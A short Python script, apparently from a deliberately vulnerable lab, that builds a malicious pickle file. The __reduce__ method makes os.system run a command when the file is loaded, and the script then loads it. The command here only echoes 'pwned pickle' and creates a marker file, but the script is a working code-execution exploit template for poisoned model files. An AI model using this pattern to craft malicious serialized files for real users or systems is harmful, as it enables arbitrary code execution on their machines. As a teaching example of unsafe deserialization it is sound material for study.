import pickle
import os

class MaliciousPayload:
    def __reduce__(self):
        return (os.system, ("echo 'pwned pickle' && touch haxor_pickle.txt",))

# Serialize the Payload
with open('damn_vuln_pickle_model.pkl', 'wb') as f:
    pickle.dump(MaliciousPayload(), f)

# Deserialize the Payload
with open('damn_vuln_pickle_model.pkl', 'rb') as f:
    pickle.load(f)